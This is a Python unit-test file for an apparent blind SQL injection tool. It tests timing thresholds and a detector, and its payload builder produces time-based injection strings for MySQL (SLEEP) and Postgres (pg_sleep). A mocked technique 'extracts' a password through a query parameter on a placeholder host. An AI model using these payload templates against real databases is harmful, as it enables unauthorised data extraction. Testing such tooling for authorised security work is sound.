"""Tests for time-based configuration, detection, payloads, and technique."""

import unittest

from core import TimeBasedTechnique
from detection import TimingDetector
from models import HttpResponseData, RequestData, TimingConfig
from models.attack import ExtractionResult
from payloads import QueryParameterInjectionPoint, TimePayloadBuilder


class TimingComponentTests(unittest.TestCase):
    def test_timing_config_validates_and_exposes_effective_threshold(self) -> None:
        config = TimingConfig(
            sleep_seconds=5.0,
            threshold_seconds=4.0,
            baseline_seconds=0.5,
            tolerance_seconds=0.25,
        )
        self.assertEqual(config.effective_threshold_seconds, 4.25)

    def test_timing_config_rejects_incoherent_values(self) -> None:
        with self.assertRaises(ValueError):
            TimingConfig(sleep_seconds=2.0, threshold_seconds=3.0)
        with self.assertRaises(ValueError):
            TimingConfig(sleep_seconds=0.0, threshold_seconds=1.0)

    def test_detector_uses_baseline_and_tolerance(self) -> None:
        detector = TimingDetector(
            threshold_seconds=4.0,
            baseline_seconds=0.5,
            tolerance_seconds=0.25,
        )
        self.assertFalse(detector.is_true(HttpResponseData(200, "", elapsed_seconds=4.24)))
        self.assertTrue(detector.is_true(HttpResponseData(200, "", elapsed_seconds=4.25)))

    def test_payload_builder_includes_configured_sleep(self) -> None:
        builder = TimePayloadBuilder(5.0)
        self.assertEqual(
            builder.build("1=1"),
            "' AND IF((1=1),SLEEP(5.0),0)-- ",
        )

    def test_payload_builder_supports_dialect_specific_template(self) -> None:
        builder = TimePayloadBuilder(
            3.0,
            prefix="' AND (",
            suffix=") AND DB_SLEEP({sleep_seconds})--",
        )
        self.assertEqual(builder.build("1=1"), "' AND (1=1) AND DB_SLEEP(3.0)--")

    def test_for_dialect_builds_known_presets(self) -> None:
        mysql = TimePayloadBuilder.for_dialect("mysql", 5.0)
        self.assertEqual(mysql.build("1=1"), "' AND IF((1=1),SLEEP(5.0),0)-- ")

        postgres = TimePayloadBuilder.for_dialect("postgres", 5.0)
        self.assertEqual(
            postgres.build("1=1"),
            "'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5.0) ELSE pg_sleep(0) END)||'",
        )

    def test_for_dialect_rejects_unknown_dialect(self) -> None:
        with self.assertRaises(ValueError):
            TimePayloadBuilder.for_dialect("mssql", 5.0)


class FakeTimingExtractor:
    def __init__(self) -> None:
        self._request = RequestData("https://example.test", query={"tracking": "base"})
        self._point = QueryParameterInjectionPoint("tracking")
        self._last_request = None
        self._last_response = None
        self._last_payload = None
        self.outcomes = {"1=1": True, "1=2": False}

    def test_condition(self, condition: str) -> bool:
        result = self.outcomes[condition]
        self._last_payload = condition
        self._last_request = self._point.inject(self._request, condition)
        self._last_response = HttpResponseData(
            200,
            "",
            elapsed_seconds=5.0 if result else 0.1,
        )
        return result

    @property
    def last_request(self):
        return self._last_request

    @property
    def last_response(self):
        return self._last_response

    @property
    def last_payload(self):
        return self._last_payload

    @property
    def injection_point(self):
        return self._point

    @property
    def base_request(self):
        return self._request

    def extract(self, expression: str) -> ExtractionResult:
        return ExtractionResult(expression, "value")


class TimeBasedTechniqueTests(unittest.TestCase):
    def test_reuses_blind_technique_oracle_flow(self) -> None:
        extractor = FakeTimingExtractor()
        technique = TimeBasedTechnique(
            extractor,
            TimingConfig(sleep_seconds=5.0, threshold_seconds=4.0),
        )

        self.assertTrue(technique.validate())
        self.assertTrue(technique.probe())
        self.assertTrue(technique.confirm())
        self.assertEqual(technique.extract("password").value, "value")


if __name__ == "__main__":
    unittest.main()
